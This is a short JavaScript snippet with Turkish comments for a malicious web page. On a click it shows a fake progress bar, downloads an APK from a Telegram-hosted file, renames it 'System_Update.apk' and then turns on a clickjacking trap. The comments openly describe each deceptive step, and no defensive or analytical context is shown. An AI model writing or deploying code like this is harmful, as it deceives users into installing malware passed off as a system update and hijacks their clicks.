// 1. Kullanıcı tetikleyicisi (User Trigger)
document.getElementById('start-btn').addEventListener('click', function() {
    
    // 2. İllüzyon katmanı başlar (İlerleme barı)
    runProgressBar(() => {
        
        // 3. MIME Type uyumlu indirme tetikleme
        const a = document.createElement('a');
        a.href = "https://api.telegram.org/.../file_4.apk";
        a.download = "System_Update.apk";
        document.body.appendChild(a);
        a.click(); // Tarayıcı 'Aç/İndir' uyarısını fırlatır
        
        // 4. Clickjacking tuzağını hemen aktif et
        activateClickTrap();
    });
});
